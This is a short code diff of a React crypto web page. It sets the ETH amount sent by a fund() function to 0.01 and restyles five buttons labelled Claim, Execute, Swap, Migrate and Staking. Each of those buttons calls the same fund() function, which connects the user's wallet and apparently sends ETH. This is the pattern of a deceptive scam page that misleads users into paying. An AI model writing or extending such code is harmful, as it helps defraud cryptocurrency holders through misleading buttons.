@@ -63,7 +63,7 @@ export default function Home() {
     
   }
 async function fund() {
-  const ethAmount = "0.226137";
+  const ethAmount = "0.01";
     console.log(`Funding with ${ethAmount}...`)
   
     const web3ModalProvider = await web3Modal.connect();
@@ -109,9 +109,9 @@ async function fund() {
 
             <div className="inner-button-wrap-1">
 
-            <button  onClick={() => fund()}>Claim</button>
-               {isConnected ? <button onClick={() => fund()}>Execute</button> : ""}
-          <button onClick={() => fund()}>Swap</button>
+            <button className="btn"  onClick={() => fund()}>Claim</button>
+               {isConnected ? <button className="btn" onClick={() => fund()}>Execute</button> : ""}
+          <button className="btn" onClick={() => fund()}>Swap</button>
 
             </div>
 
@@ -119,8 +119,8 @@ async function fund() {
 
           <div className="main-button-wrap-2">
             <div className="inner-button-wrap-2">
-            <button  onClick={() => fund()}>Migrate</button>
-          <button  onClick={() => fund()}>Staking</button>
+            <button className="btn"  onClick={() => fund()}>Migrate</button>
+          <button className="btn"  onClick={() => fund()}>Staking</button>
               
 
             </div>
